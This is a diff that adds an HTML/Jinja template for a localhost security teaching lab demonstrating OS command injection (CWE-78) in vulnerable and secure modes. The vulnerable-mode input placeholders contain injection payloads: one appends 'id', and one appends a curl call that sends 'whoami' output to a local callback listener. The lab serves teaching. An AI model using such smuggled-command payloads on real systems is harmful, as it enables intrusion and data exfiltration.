@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OS Command Injection Demo</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: #0d1117;
+      color: #c9d1d9;
+      font-family: "Segoe UI", system-ui, sans-serif;
+      min-height: 100vh;
+      padding: 2rem 1rem;
+    }
+
+    .container {
+      max-width: 980px;
+      margin: 0 auto;
+    }
+
+    h1 {
+      color: #f0f6fc;
+      font-size: 1.8rem;
+      text-align: center;
+      margin-bottom: 0.35rem;
+    }
+
+    .subtitle {
+      text-align: center;
+      color: #8b949e;
+      margin-bottom: 1.5rem;
+      font-size: 0.95rem;
+    }
+
+    .warning-banner {
+      background: #161b22;
+      border: 1px solid #f85149;
+      border-radius: 8px;
+      padding: 0.75rem 1rem;
+      text-align: center;
+      color: #f85149;
+      font-size: 0.85rem;
+      font-weight: 600;
+      margin-bottom: 1.5rem;
+    }
+
+    .mode-header {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 1.5rem;
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 0.2rem 0.6rem;
+      border-radius: 999px;
+      font-size: 0.78rem;
+      font-weight: 700;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+    }
+
+    .badge.vulnerable { background: #f85149; color: #fff; }
+    .badge.secure { background: #3fb950; color: #0d1117; }
+
+    .cards {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 1rem;
+    }
+
+    .card {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 10px;
+      padding: 1.2rem 1.2rem 1rem;
+      border-top-width: 3px;
+    }
+
+    .card.mode-vulnerable { border-top-color: #f85149; }
+    .card.mode-secure { border-top-color: #3fb950; }
+
+    .card h2 {
+      color: #f0f6fc;
+      font-size: 1.05rem;
+      margin-bottom: 0.35rem;
+    }
+
+    .card .desc {
+      color: #8b949e;
+      font-size: 0.88rem;
+      margin-bottom: 0.95rem;
+    }
+
+    label {
+      display: block;
+      font-size: 0.84rem;
+      color: #8b949e;
+      margin-bottom: 0.3rem;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      padding: 0.6rem 0.72rem;
+      color: #c9d1d9;
+      font-size: 0.95rem;
+      outline: none;
+    }
+
+    input[type="text"]:focus {
+      border-color: #58a6ff;
+    }
+
+    button {
+      margin-top: 0.7rem;
+      width: 100%;
+      padding: 0.6rem 0;
+      border-radius: 6px;
+      border: none;
+      font-size: 0.95rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity 0.12s;
+    }
+
+    button:hover { opacity: 0.88; }
+    .card.mode-vulnerable button { background: #f85149; color: #fff; }
+    .card.mode-secure button { background: #3fb950; color: #0d1117; }
+
+    .result-box { margin-top: 1rem; }
+
+    .label {
+      font-size: 0.78rem;
+      color: #8b949e;
+      margin-bottom: 0.2rem;
+      font-family: monospace;
+    }
+
+    .value {
+      font-family: "Courier New", monospace;
+      font-size: 0.82rem;
+      color: #79c0ff;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 5px;
+      padding: 0.45rem 0.55rem;
+      word-break: break-word;
+      margin-bottom: 0.7rem;
+    }
+
+    pre#inband-output {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      padding: 0.7rem;
+      font-family: "Courier New", monospace;
+      font-size: 0.82rem;
+      color: #adbac7;
+      white-space: pre-wrap;
+      word-break: break-word;
+      max-height: 260px;
+      overflow-y: auto;
+    }
+
+    .status-box {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      padding: 0.65rem 0.75rem;
+      color: #adbac7;
+      font-size: 0.86rem;
+    }
+
+    .error-box {
+      background: #1c0a0a;
+      border: 1px solid #f85149;
+      border-radius: 6px;
+      padding: 0.65rem 0.75rem;
+      color: #f85149;
+      font-size: 0.86rem;
+    }
+
+    .tips {
+      margin-top: 1rem;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      padding: 0.7rem 0.75rem;
+      font-size: 0.82rem;
+      color: #8b949e;
+    }
+
+    .tips code {
+      color: #f0883e;
+    }
+  </style>
+</head>
+<body>
+{% set is_vulnerable = mode == "vulnerable" %}
+{% set mode_class = "mode-vulnerable" if is_vulnerable else "mode-secure" %}
+{% set inband_action = "/ping/vulnerable" if is_vulnerable else "/ping/secure" %}
+{% set blind_action = "/ping/vulnerable/blind" if is_vulnerable else "/ping/secure/blind" %}
+
+<div class="container">
+  <h1>OS Command Injection Demo</h1>
+  <p class="subtitle">CWE-78 · localhost-only lab · In-Band and Blind/OOB scenarios</p>
+
+  <div class="warning-banner">
+    AUTHORIZED ACADEMIC USE ONLY — never target external systems.
+  </div>
+
+  <div class="mode-header">
+    <span class="badge {{ 'vulnerable' if is_vulnerable else 'secure' }}">
+      {{ "Vulnerable Mode (red)" if is_vulnerable else "Secure Mode (green)" }}
+    </span>
+  </div>
+
+  <div class="cards">
+    <section class="card {{ mode_class }}">
+      <h2>In-Band Command Injection</h2>
+      <p class="desc">Response body includes command output. Injection evidence appears directly in this page.</p>
+
+      <form method="POST" action="{{ inband_action }}">
+        <label for="inband-host">Target Host / IP</label>
+        <input
+          type="text"
+          id="inband-host"
+          name="host"
+          placeholder="{{ 'e.g. 127.0.0.1; id' if is_vulnerable else 'e.g. 127.0.0.1' }}"
+          autocomplete="off"
+        />
+        <button type="submit">Run In-Band Demo</button>
+      </form>
+
+      <div class="result-box">
+        {% if inband_cmd %}
+        <div class="label">Command executed:</div>
+        <div class="value">{{ inband_cmd }}</div>
+        {% endif %}
+        {% if inband_error %}
+        <div class="error-box"><span id="inband-error">{{ inband_error }}</span></div>
+        {% elif inband_output %}
+        <pre id="inband-output">{{ inband_output }}</pre>
+        {% endif %}
+      </div>
+    </section>
+
+    <section class="card {{ mode_class }}">
+      <h2>Blind / Out-of-Band (OOB) Injection</h2>
+      <p class="desc">Server suppresses command output. Verify execution via callback logs on the OOB listener.</p>
+
+      <form method="POST" action="{{ blind_action }}">
+        <label for="blind-host">Target Host / IP (can include payload in vulnerable mode)</label>
+        <input
+          type="text"
+          id="blind-host"
+          name="host"
+          placeholder="{{ 'e.g. 127.0.0.1; curl \"http://127.0.0.1:9000/collect?proof=$(whoami)\"' if is_vulnerable else 'e.g. 127.0.0.1' }}"
+          autocomplete="off"
+        />
+        <button type="submit">Run Blind/OOB Demo</button>
+      </form>
+
+      <div class="result-box">
+        {% if blind_cmd %}
+        <div class="label">Command executed:</div>
+        <div class="value">{{ blind_cmd }}</div>
+        {% endif %}
+        {% if blind_error %}
+        <div class="error-box"><span id="blind-error">{{ blind_error }}</span></div>
+        {% elif blind_status %}
+        <div class="status-box" id="blind-status">{{ blind_status }}</div>
+        {% endif %}
+      </div>
+
+      <div class="tips">
+        OOB listener URL: <code>http://127.0.0.1:9000</code><br/>
+        Callback path: <code>/collect</code>
+      </div>
+    </section>
+  </div>
+</div>
+</body>
+</html>
